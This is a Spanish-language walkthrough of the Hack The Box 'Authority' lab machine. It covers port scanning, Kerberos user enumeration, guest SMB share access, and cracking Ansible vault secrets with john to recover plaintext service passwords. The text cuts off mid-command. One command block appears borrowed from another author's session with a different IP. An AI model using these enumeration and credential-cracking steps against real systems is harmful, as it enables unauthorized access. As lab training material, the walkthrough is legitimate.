---
tags:
title: Authority - Medium (HTB)
permalink: /Authority-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimientos 

```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49671,49674,49675,49679,49682,49691,49699,55633 10.129.229.56
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 13:39 -03
Nmap scan report for authority.htb (10.129.229.56)
Host is up (0.81s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-28 20:40:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-10-28T20:42:40+00:00; +4h01m28s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T20:42:38+00:00; +4h01m29s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
|_ssl-date: 2025-10-28T20:42:39+00:00; +4h01m29s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-10-28T20:42:38+00:00; +4h01m29s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Not valid before: 2022-08-09T23:03:21
|_Not valid after:  2024-08-09T23:13:21
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Not valid before: 2025-10-26T20:37:43
|_Not valid after:  2027-10-29T08:16:07
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
55633/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-28T20:42:08
|_  start_date: N/A
|_clock-skew: mean: 4h01m28s, deviation: 0s, median: 4h01m28s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.92 seconds
```
# Service enumeration 

## Shell as svc_ldap

### HTTPS / Port 8433

Vemos que por ssl hay una pagina web corriendo el servicio `PWM`. donde dentro de la misma pagina vemos una version y un panel de login del cual debemos de disponer de credenciales validas para loguearnos, y que si las mismas no son validas vemos el siguiente mensaje de error.

![{803B45B7-CFDD-4058-AC4C-420038D2739B}](images/{803B45B7-CFDD-4058-AC4C-420038D2739B}.png)

En el mismo delata a un usuario: `svc_ldap`. y Dentro de una de las funcionalidades de la misma revela tambienn a `svc_pwm`, por lo que con kerbrute podriamos validar si estos usuarios son validos en el dominio.


![{1FF68E4B-4D08-4D93-8BCE-5DCDE16D2F6E}](images/{1FF68E4B-4D08-4D93-8BCE-5DCDE16D2F6E}.png)

### Kerbrute validation

```bash
kerbrute userenum --domain authority.htb --dc 10.129.229.56 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 10/28/25 - Ronnie Flathers @ropnop

2025/10/28 13:58:43 >  Using KDC(s):
2025/10/28 13:58:43 >   10.129.229.56:88

2025/10/28 13:58:44 >  [+] VALID USERNAME:       svc_ldap@authority.htb
2025/10/28 13:58:45 >  Done! Tested 3 usernames (1 valid) in 1.312 seconds

```

Como vemos que si es valido lo metemos dentro de un archivo llamado `users`.

### SMB / Port 445 

Probemos con un null session por `smb` para enumerar recursos compartidos a nivel de red.

```bash
smbmap -u '' -H 10.129.229.56  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 0 hosts serving SMB                                                                                                  
[*] Closed 0 connections 
```

Como veo que no puedo ver si el usuario `guest` esta habilitado.

```bash
smbmap -u 'guest' -H 10.129.229.56

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.129.229.56:445       Name: authority.htb             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Department Shares                                       NO ACCESS
        Development                                             READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
[*] Closed 1 connections                                                                            
```

Como el usuario `guest` esta habilitado puedo enumerar el share `Development`. Asi que con `smbclient` de impacket me conecto al servicio.

```bash
impacket-smbclient authority.htb/guest@10.129.229.56 -dc-ip 10.129.229.56 -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# use development 
# ls
drw-rw-rw-          0  Fri Mar 17 10:37:34 2023 .
drw-rw-rw-          0  Fri Mar 17 10:37:34 2023 ..
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 Automation
# cd Automation
ls
# ls
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 .
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 ..
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 Ansible
# cd Ansible
ls
# ls
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 .
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 ..
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 ADCS
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 LDAP
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 PWM
drw-rw-rw-          0  Fri Mar 17 10:37:52 2023 SHARE

```

Como veo que son varios directorios, para no enumerar cada uno de forma manual, voy a usar el modulo `spider_plus` de `netexec`. El cual enumera cada uno de estos y lo representa en un archivo `json` de una forma mas linda.

```bash
nxc smb 10.129.229.56 -u guest -p '' -M spider_plus
SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False) 
SMB         10.129.229.56   445    AUTHORITY        [+] authority.htb\guest: 
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus
SMB         10.129.229.56   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.229.56   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.229.56   445    AUTHORITY        -----           -----------     ------
SMB         10.129.229.56   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.229.56   445    AUTHORITY        C$                              Default share
SMB         10.129.229.56   445    AUTHORITY        Department Shares                 
SMB         10.129.229.56   445    AUTHORITY        Development     READ            
SMB         10.129.229.56   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.229.56   445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.129.229.56   445    AUTHORITY        SYSVOL                          Logon server share 
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [+] Saved share-file metadata to "/root/.nxc/modules/nxc_spider_plus/10.129.229.56.json".
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] SMB Shares:           7 (ADMIN$, C$, Department Shares, Development, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] SMB Readable Shares:  2 (Development, IPC$)
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] Total folders found:  27
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] Total files found:    52
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] File size average:    1.5 KB
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] File size min:        4 B
SPIDER_PLUS 10.129.229.56   445    AUTHORITY        [*] File size max:        11.1 KB

```

Nos movemos al directorio a inspeccionar el archivo que nos dejo.

```json
cat 10.129.229.56.json| jq            
{
  "Development": {
    "Automation/Ansible/ADCS/.ansible-lint": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "259 B"
    },
    "Automation/Ansible/ADCS/.yamllint": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "205 B"
    },
    "Automation/Ansible/ADCS/LICENSE": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "11.1 KB"
    },
    "Automation/Ansible/ADCS/README.md": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "7.11 KB"
    },
    "Automation/Ansible/ADCS/SECURITY.md": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "924 B"
    },
    "Automation/Ansible/ADCS/defaults/main.yml": {
      "atime_epoch": "2023-04-23 19:50:28",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-04-23 19:50:28",
      "size": "1.54 KB"
    },
    "Automation/Ansible/ADCS/meta/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-04-23 19:50:36",
      "size": "549 B"
    },
    "Automation/Ansible/ADCS/meta/preferences.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-04-23 19:50:33",
      "size": "22 B"
    },
    "Automation/Ansible/ADCS/molecule/default/converge.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "106 B"
    },
    "Automation/Ansible/ADCS/molecule/default/molecule.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "526 B"
    },
    "Automation/Ansible/ADCS/molecule/default/prepare.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "371 B"
    },
    "Automation/Ansible/ADCS/requirements.txt": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "466 B"
    },
    "Automation/Ansible/ADCS/requirements.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "264 B"
    },
    "Automation/Ansible/ADCS/tasks/assert.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "2.87 KB"
    },
    "Automation/Ansible/ADCS/tasks/generate_ca_certs.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-04-23 19:50:56",
      "size": "2.21 KB"
    },
    "Automation/Ansible/ADCS/tasks/init_ca.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "1.21 KB"
    },
    "Automation/Ansible/ADCS/tasks/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-04-23 19:50:44",
      "size": "1.33 KB"
    },
    "Automation/Ansible/ADCS/tasks/requests.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "4.12 KB"
    },
    "Automation/Ansible/ADCS/templates/extensions.cnf.j2": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "1.62 KB"
    },
    "Automation/Ansible/ADCS/templates/openssl.cnf.j2": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "11.03 KB"
    },
    "Automation/Ansible/ADCS/tox.ini": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "419 B"
    },
    "Automation/Ansible/ADCS/vars/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "2.1 KB"
    },
    "Automation/Ansible/LDAP/.bin/clean_vault": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "677 B"
    },
    "Automation/Ansible/LDAP/.bin/diff_vault": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "357 B"
    },
    "Automation/Ansible/LDAP/.bin/smudge_vault": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "768 B"
    },
    "Automation/Ansible/LDAP/.travis.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "1.38 KB"
    },
    "Automation/Ansible/LDAP/README.md": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "5.63 KB"
    },
    "Automation/Ansible/LDAP/TODO.md": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "119 B"
    },
    "Automation/Ansible/LDAP/Vagrantfile": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "640 B"
    },
    "Automation/Ansible/LDAP/defaults/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-04-23 19:51:08",
      "size": "1.02 KB"
    },
    "Automation/Ansible/LDAP/files/pam_mkhomedir": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "170 B"
    },
    "Automation/Ansible/LDAP/handlers/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "277 B"
    },
    "Automation/Ansible/LDAP/meta/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "416 B"
    },
    "Automation/Ansible/LDAP/tasks/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "5.11 KB"
    },
    "Automation/Ansible/LDAP/templates/ldap_sudo_groups.j2": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "131 B"
    },
    "Automation/Ansible/LDAP/templates/ldap_sudo_users.j2": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "106 B"
    },
    "Automation/Ansible/LDAP/templates/sssd.conf.j2": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "2.5 KB"
    },
    "Automation/Ansible/LDAP/templates/sudo_group.j2": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "30 B"
    },
    "Automation/Ansible/LDAP/vars/debian.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "174 B"
    },
    "Automation/Ansible/LDAP/vars/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "75 B"
    },
    "Automation/Ansible/LDAP/vars/redhat.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "222 B"
    },
    "Automation/Ansible/LDAP/vars/ubuntu-14.04.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "203 B"
    },
    "Automation/Ansible/PWM/README.md": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "1.26 KB"
    },
    "Automation/Ansible/PWM/ansible.cfg": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "491 B"
    },
    "Automation/Ansible/PWM/ansible_inventory": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "174 B"
    },
    "Automation/Ansible/PWM/defaults/main.yml": {
      "atime_epoch": "2023-04-23 19:51:38",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-04-23 19:51:38",
      "size": "1.55 KB"
    },
    "Automation/Ansible/PWM/handlers/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "4 B"
    },
    "Automation/Ansible/PWM/meta/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "199 B"
    },
    "Automation/Ansible/PWM/tasks/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "1.79 KB"
    },
    "Automation/Ansible/PWM/templates/context.xml.j2": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "422 B"
    },
    "Automation/Ansible/PWM/templates/tomcat-users.xml.j2": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "388 B"
    },
    "Automation/Ansible/SHARE/tasks/main.yml": {
      "atime_epoch": "2023-03-17 10:20:48",
      "ctime_epoch": "2023-03-17 10:20:48",
      "mtime_epoch": "2023-03-17 10:37:52",
      "size": "1.83 KB"
    }
  }
}
```

Dentro de `ansible_inventory`vemos claves del usuario `Administrator`

```
ansible_user: administrator
ansible_password: Welcome1
ansible_port: 5985
ansible_connection: winrm
ansible_winrm_transport: ntlm
ansible_winrm_server_cert_validation: ignore
```

Probamos su validacion con `netexec` pero no funcionan.

```
oxdf@hacky$ netexec winrm authority.htb -u administrator -p 'Welcome1'
WINRM       10.10.11.222    5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.10.11.222    5985   AUTHORITY        [-] authority.htb\administrator:Welcome1
```

`defaults/main.yml` tiene valores de configuracion para `PWM`:

```bash
cat Automation/Ansible/PWM/defaults/main.yml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764

```

Esos valores estan protegidos con `Ansible vault`, además tenemos el script de `john` llamado `ansible2john` el cual necesita de un hash o una clave con el formato que vemos para poder pasarlo a un hash crackeable para la herramienta `john`. Por lo que cada uno de estos lo metemos en cada archivos con su identificacion y luego con `cat` visualizamos y con `tee` los metemos en un archivos unico para poder con john romper cada uno.

```bash
cat *pass* | tee -a vault_hashes                     
hash:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
ldap:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
pwd_admin_pass:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
                                                                                                                                                                                           
┌──(venv)─(root㉿zsln)-[/home/…/Desktop/zsln/htb/authority]
└─# cat vault_hashes                
hash:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
ldap:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
pwd_admin_pass:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
                                                                                                                                                                                           
┌──(venv)─(root㉿zsln)-[/home/…/Desktop/zsln/htb/authority]
└─# john vault_hashes --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (ansible, Ansible Vault [PBKDF2-SHA256 HMAC-256 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 10000 for all loaded hashes
Will run 9 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!@#$%^&*         (pwd_admin_pass)     
!@#$%^&*         (hash)     
2g 0:00:00:09 DONE (2025-10-28 14:47) 0.2190g/s 4384p/s 8769c/s 8769C/s 051790..mamoru
Warning: passwords printed above might not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Vemos que nos descubre la misma pass, y tiene sentido ya que todos estan dentro del mismo archivo yml. por lo que ahora con `ansible-vault` podemos usar el comando, `decrypt`, para proporcinarle la clave q vimos y asi poder descubrir la pass protegida detras de estos hashes

```bash
cat pwm_admin_login | ansible-vault decrypt
Vault password: 
Decryption successful
svc_pwm
```

```bash
cat pwm_admin_password | ansible-vault decrypt
Vault password: 
Decryption successful
pWm_@dm!N_!23
```

```bash
cat ldap_admin_password | ansible-vault decrypt
Vault password: 
Decryption successful
DevT3st@123 
```

Verificamos que podamos auntenticarnos en servicios como `smb` o `ldap` pero no

```bash
nxc smb 10.129.229.56 -u svc_ldap -p passwords 
